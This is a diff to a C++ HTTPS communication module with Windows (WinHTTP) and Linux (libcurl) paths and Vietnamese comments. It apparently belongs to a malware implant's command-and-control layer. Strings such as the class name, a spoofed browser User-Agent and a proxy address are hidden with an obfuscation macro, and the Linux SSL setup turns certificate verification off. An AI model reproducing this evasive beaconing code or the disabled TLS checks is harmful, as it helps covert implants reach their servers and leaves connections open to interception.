@@ -4,33 +4,114 @@
 #include "core/Configuration.h"
 #include "security/Obfuscation.h"
 #include "utils/StringUtils.h"
+#include "utils/NetworkUtils.h"
 #include <vector>
 #include <cstdint>
 #include <string>
 
 #if PLATFORM_WINDOWS
 #include <winhttp.h>
+#pragma comment(lib, "winhttp.lib")
 #else
 #include <curl/curl.h>
 #endif
 
 // Obfuscated strings
 static const auto OBF_HTTPS_COMMS = OBFUSCATE("HttpsComms");
+static const auto OBF_USER_AGENT = OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
 HttpsComms::HttpsComms(Configuration* config)
-    : HttpComms(config) {}
+    : m_config(config)
+    #if PLATFORM_WINDOWS
+    , m_hSession(NULL), m_hConnect(NULL)
+    #else
+    , m_hSession(nullptr), m_hConnect(nullptr)
+    #endif
+{}
+
+HttpsComms::~HttpsComms() {
+    Cleanup();
+}
 
 bool HttpsComms::Initialize() {
     #if PLATFORM_WINDOWS
-    // Gọi base implementation trước
-    if (!HttpComms::Initialize()) {
-        return false;
+    // Windows implementation với WinHTTP
+    std::wstring userAgent = std::wstring(OBF_USER_AGENT.begin(), OBF_USER_AGENT.end());
+    
+    DWORD accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
+    LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
+    
+    if (m_config->GetUseProxy()) {
+        accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+        std::string proxyStr = OBFUSCATE("http://proxy:8080");
+        // Convert to wide string if needed
     }
     
-    return ConfigureSslWindows();
+    m_hSession = WinHttpOpen(
+        userAgent.c_str(),
+        accessType,
+        proxyName,
+        WINHTTP_NO_PROXY_BYPASS,
+        0
+    );
+
+    if (!m_hSession) {
+        LOG_ERROR("Failed to initialize WinHTTP session: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    // Configure timeouts
+    int timeout = m_config->GetTimeout();
+    WinHttpSetTimeouts(
+        m_hSession,
+        timeout,
+        timeout,
+        timeout,
+        timeout
+    );
+
+    // Parse server URL
+    std::string url = m_config->GetServerUrl();
+    std::wstring wUrl(url.begin(), url.end());
+    
+    URL_COMPONENTS urlComp;
+    ZeroMemory(&urlComp, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+    urlComp.dwSchemeLength = (DWORD)-1;
+    urlComp.dwHostNameLength = (DWORD)-1;
+    urlComp.dwUrlPathLength = (DWORD)-1;
+
+    if (!WinHttpCrackUrl(wUrl.c_str(), static_cast<DWORD>(wUrl.length()), 0, &urlComp)) {
+        LOG_ERROR("Failed to parse server URL: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
+
+    // Establish connection
+    m_hConnect = WinHttpConnect(
+        m_hSession,
+        hostName.c_str(),
+        urlComp.nPort,
+        0
+    );
+
+    if (!m_hConnect) {
+        LOG_ERROR("Failed to establish HTTPS connection: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    // Configure SSL
+    if (!ConfigureSslWindows()) {
+        LOG_ERROR("Failed to configure SSL");
+        return false;
+    }
+
+    LOG_INFO("HTTPS communication initialized successfully");
+    return true;
     
     #else
-    // Linux không cần additional initialization cho HTTPS với libcurl
+    // Linux implementation - libcurl không cần explicit initialization
     LOG_INFO("HTTPS communication initialized (using libcurl)");
     return true;
     #endif
@@ -243,7 +324,9 @@ bool HttpsComms::ConfigureSslWindows() {
     return true;
 }
 #else
-bool HttpsComms::ConfigureSslLinux(CURL* curl) {
+bool HttpsComms::ConfigureSslLinux(void* curl_ptr) {
+    CURL* curl = static_cast<CURL*>(curl_ptr);
+    
     // Configure SSL options for libcurl
     // Tắt certificate verification (cho testing, có thể bật lại cho production)
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
@@ -270,15 +353,30 @@ bool HttpsComms::ConfigureSslLinux(CURL* curl) {
 }
 #endif
 
-// Các hàm khác kế thừa từ HttpComms
 void HttpsComms::Cleanup() {
-    HttpComms::Cleanup();
+    #if PLATFORM_WINDOWS
+    if (m_hConnect) {
+        WinHttpCloseHandle(m_hConnect);
+        m_hConnect = NULL;
+    }
+    if (m_hSession) {
+        WinHttpCloseHandle(m_hSession);
+        m_hSession = NULL;
+    }
+    #else
+    // Cleanup for Linux - libcurl tự quản lý resource
+    m_hConnect = nullptr;
+    m_hSession = nullptr;
+    #endif
+    
+    LOG_DEBUG("HTTPS communication cleaned up");
 }
 
 bool HttpsComms::TestConnection() const {
-    return HttpComms::TestConnection();
+    return utils::NetworkUtils::CheckInternetConnection();
 }
 
 std::vector<uint8_t> HttpsComms::ReceiveData() {
-    return HttpComms::ReceiveData();
+    // Implement HTTPS data reception if needed
+    return std::vector<uint8_t>();
 }
